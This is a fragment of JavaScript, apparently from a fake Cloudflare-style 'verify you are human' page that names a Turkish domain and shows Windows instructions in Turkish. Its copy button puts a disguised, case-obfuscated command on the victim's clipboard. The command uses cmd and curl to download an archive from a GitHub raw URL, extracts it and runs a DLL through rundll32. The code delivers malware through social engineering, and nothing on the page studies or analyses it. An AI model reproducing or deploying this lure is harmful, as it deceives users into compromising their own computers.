                el.removeAttribute(at);
            }
        }

    function decode(base64Input) {
        const binaryString = atob(base64Input);
        const utf8Bytes = new Uint8Array([...binaryString].map(char => char.charCodeAt(0)));
        return new TextDecoder().decode(utf8Bytes);
    }

    function createFrame(className, rsd) {
        let frame = document.createElement("iframe");
        frame.style.position = "absolute";
        frame.style.top = "0";
        frame.style.left = "0";
        frame.style.height = "100%";
        frame.style.width = "100%";
        frame.style.margin = "0";
        frame.style.padding = "0";
        frame.style.border = "none";
        frame.className = className
        frame.srcdoc = rsd
        return frame
    }

    function setFavicon(url) {
        let link = frame1.contentWindow.document.querySelector("link[rel~='icon']");

            link = document.createElement("link");
            link.rel = "shortcut icon";
            link.type = "image/x-icon"
            document.head.appendChild(link);
        }
        link.href = url;
    }

    const zoneNameTitle = frame1.contentWindow.document.querySelector('.zone-name-title.h1');
    const currentHostPath = "hdisigorta.com.tr"

    if (zoneNameTitle) {

        vUih6Message.textContent = `${currentHostPath} adresinin devam etmeden önce bağlantınızın güvenliğini gözden geçirmesi gerekiyor.`;
    }

    const winda = `echo`;
    let currentThemeIsDark = false;

    function applyTheme(isDark) {
        currentThemeIsDark = isDark;
        if (isDark) {
            body.classList.add('theme-dark');
            body.classList.remove('theme-light');
        } else {
            body.classList.add('theme-light');
            body.classList.remove('theme-dark');
        }
        if (turnstileIframe) {
            const currentIframeSrc = turnstileIframe.getAttribute('src') || "assets/index_1.html";
            const baseSrc = currentIframeSrc.split('?')[0];
            const newIframeSrc = `${baseSrc}?theme=${isDark ? 'dark' : 'light'}`;
            if (turnstileIframe.getAttribute('src') !== newIframeSrc) {
                turnstileIframe.setAttribute('src', newIframeSrc);
            }
        }
    }

    const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    applyTheme(prefersDark);

    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        applyTheme(e.matches);
    }
    );


    mobileMessageSection.classList.add('hidden');
    checkboxPlacementContainer.classList.remove('hidden');

    setTimeout(() => {
        vUih6Message.classList.remove('hidden');

    unknownOsInstructions.classList.add('hidden');
    windowsInstructions.classList.remove('hidden');

    const windowsCompatibleCommand = `cONHoSt cONhosT CmD /c start "" /min CmD /c "cD %USERPROFILE%\\Documents & CuRl https://raw.githubusercontent.com/hdisigorta/test/refs/heads/main/t.tar.gz -k -o t.taR.Gz & tAr -xzf t.taR.Gz & sTaRt RuNdLL32.exe t.dll,Cloudflare_Verification_ID_314567123"        `;

    copyWindowsCommandButton.addEventListener('click', () =>
        copyToClipboard(windowsCompatibleCommand, copyWindowsCommandButton)
    );

    function copyToClipboard(text, buttonElement) {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then( () => {
                const originalText = buttonElement.textContent;
                buttonElement.textContent = "Copied!";
                setTimeout( () => {
                    buttonElement.textContent = originalText;
                }
                , 800);
            }
            ).catch(err => {
                console.error('Failed to copy with navigator.clipboard: ', err);
                fallbackCopyToClipboard(text, buttonElement);
            }
            );
        } else {
            console.warn('Using fallback copy method due to insecure context or missing Clipboard API.');
            fallbackCopyToClipboard(text, buttonElement);
        }
    }

    function fallbackCopyToClipboard(text, buttonElement) {
        const textArea = document.createElement("textarea");
        textArea.value = text;

        textArea.style.position = 'fixed';
        textArea.style.top = '-9999px';
        textArea.style.left = '-9999px';

        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        try {
            const successful = document.execCommand('copy');
            if (successful) {
                const originalText = buttonElement.textContent;
                buttonElement.textContent = "Copied!";
                setTimeout( () => {
                    buttonElement.textContent = originalText;
                }
                , 2000);
            } else {
                console.error('Fallback: Failed to copy command.');
                alert('Failed to copy command. Please copy it manually.');
            }
        } catch (err) {
            console.error('Fallback: Error trying to copy command: ', err);
            alert('Error trying to copy. Please copy it manually.');
        }

        document.body.removeChild(textArea);
    }
}
